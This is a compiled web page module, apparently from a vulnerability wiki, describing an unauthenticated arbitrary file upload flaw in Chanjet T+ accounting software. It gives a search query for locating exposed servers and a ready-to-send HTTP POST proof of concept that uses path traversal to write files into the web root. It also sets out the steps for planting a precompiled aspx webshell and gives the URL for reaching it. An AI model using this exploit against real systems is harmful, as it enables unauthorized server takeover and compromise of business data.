@@ -1,0 +1,19 @@
+import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const d={},t=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>用友 畅捷通T+ Upload.aspx接口存在任意文件上传漏洞，攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>用友 畅捷通T+
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;畅捷通-TPlus&quot;
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131041324.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的接口为<code>/tplus/SM/SetupAccount/Upload.aspx</code>, 对应文件 <code>App_Web_upload.aspx.9475d17f.dll</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131041333.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>上传文件类型验证不完善，可上传任意文件到服务器中的任意位置，验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
+Host:
+Accept: */*
+Accept-Encoding: gzip, deflate
+Content-Length: 261
+User-Agent: Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ko-KR) AppleWebKit/535.16.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.16.4
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXR9biLu
+Connection: close
+
+------WebKitFormBoundaryVXR9biLu
+Content-Disposition: form-data; name=&quot;File1&quot;;filename=&quot;../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/1.txt&quot;
+Content-Type: image/jpeg
+
+1
+------WebKitFormBoundaryVXR9biLu--
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由于应用为预编译的，直接上传的 <code>aspx木马</code>无法直接利用，需要通过上传 <code>dll 与 compiled </code>文件后利用Webshell</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131041137.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将 <code>dll 与 compiled</code> 文件上传至 Web应用的 bin目录上，aspx上传至 Web根目录下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131042534.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131042543.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131042554.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再访问写入的Webshell进行连接</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/tplus/shell.aspx?preload=1	
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,21),l=[t];function s(o,r){return a(),i("div",null,l)}const u=e(d,[["render",s],["__file","用友 畅捷通T_ Upload.aspx 任意文件上传漏洞.html.vue"]]);export{u as default};
